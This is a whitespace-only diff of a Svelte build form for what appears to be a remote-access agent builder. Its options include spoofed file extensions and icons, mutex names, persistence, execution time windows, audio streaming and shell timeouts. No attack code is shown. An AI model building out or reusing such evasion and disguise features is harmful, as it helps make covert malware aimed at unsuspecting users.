@@ -27,21 +27,21 @@
 		type TargetArch,
 		type TargetOS
 	} from './lib/constants.js';
-        import {
-                addCustomCookie as createCustomCookie,
-                addCustomHeader as createCustomHeader,
-                generateMutexName as randomMutexSuffix,
-                normalizeSpoofExtension,
-                removeCustomCookie as deleteCustomCookie,
-                removeCustomHeader as deleteCustomHeader,
-                sanitizeMutexName,
-                updateCustomCookie as writeCustomCookie,
-                updateCustomHeader as writeCustomHeader,
-                validateSpoofExtension,
-                withPresetSpoofExtension
-        } from './lib/utils.js';
-        import { prepareBuildRequest } from './lib/build-request.js';
-        import { agentModules } from '../../../../../shared/modules/index.js';
+	import {
+		addCustomCookie as createCustomCookie,
+		addCustomHeader as createCustomHeader,
+		generateMutexName as randomMutexSuffix,
+		normalizeSpoofExtension,
+		removeCustomCookie as deleteCustomCookie,
+		removeCustomHeader as deleteCustomHeader,
+		sanitizeMutexName,
+		updateCustomCookie as writeCustomCookie,
+		updateCustomHeader as writeCustomHeader,
+		validateSpoofExtension,
+		withPresetSpoofExtension
+	} from './lib/utils.js';
+	import { prepareBuildRequest } from './lib/build-request.js';
+	import { agentModules } from '../../../../../shared/modules/index.js';
 
 	type BuildStatus = 'idle' | 'running' | 'success' | 'error';
 
@@ -93,13 +93,13 @@
 	let executionStartDate = $state('');
 	let executionEndDate = $state('');
 	let executionRequireInternet = $state(true);
-        let customHeaders = $state<HeaderKV[]>([{ key: '', value: '' }]);
-        let customCookies = $state<CookieKV[]>([{ name: '', value: '' }]);
-        let audioStreamingEnabled = $state(false);
-        let audioStreamingTouched = $state(false);
-        const moduleCatalog = agentModules;
-        let selectedModules = $state(moduleCatalog.map((module) => module.id));
-        type BuildTab = 'connection' | 'persistence' | 'execution' | 'presentation';
+	let customHeaders = $state<HeaderKV[]>([{ key: '', value: '' }]);
+	let customCookies = $state<CookieKV[]>([{ name: '', value: '' }]);
+	let audioStreamingEnabled = $state(false);
+	let audioStreamingTouched = $state(false);
+	const moduleCatalog = agentModules;
+	let selectedModules = $state(moduleCatalog.map((module) => module.id));
+	type BuildTab = 'connection' | 'persistence' | 'execution' | 'presentation';
 	const DEFAULT_TAB: BuildTab = 'connection';
 	let activeTab = $state<BuildTab>(DEFAULT_TAB);
 
@@ -634,12 +634,12 @@
 			executionRequireInternet,
 			audioStreamingTouched,
 			audioStreamingEnabled,
-                        fileIconName,
-                        fileIconData,
-                        fileInformation,
-                        isWindowsTarget,
-                        modules: selectedModules
-                });
+			fileIconName,
+			fileIconData,
+			fileInformation,
+			isWindowsTarget,
+			modules: selectedModules
+		});
 
 		if (!buildResult.ok) {
 			buildError = buildResult.error;
@@ -751,18 +751,18 @@
 									bind:pollIntervalMs
 									bind:maxBackoffMs
 									bind:shellTimeoutSeconds
-                                                                        {customHeaders}
-                                                                        {customCookies}
-                                                                        bind:audioStreamingEnabled
-                                                                        {audioStreamingTouched}
-                                                                        {markAudioStreamingTouched}
-                                                                        availableModules={moduleCatalog}
-                                                                        bind:selectedModules
-                                                                        {addCustomHeader}
-                                                                        {updateCustomHeader}
-                                                                        {removeCustomHeader}
-                                                                        {addCustomCookie}
-                                                                        {updateCustomCookie}
+									{customHeaders}
+									{customCookies}
+									bind:audioStreamingEnabled
+									{audioStreamingTouched}
+									{markAudioStreamingTouched}
+									availableModules={moduleCatalog}
+									bind:selectedModules
+									{addCustomHeader}
+									{updateCustomHeader}
+									{removeCustomHeader}
+									{addCustomCookie}
+									{updateCustomCookie}
 									{removeCustomCookie}
 								/>
 							{:else if tabErrors.connection}
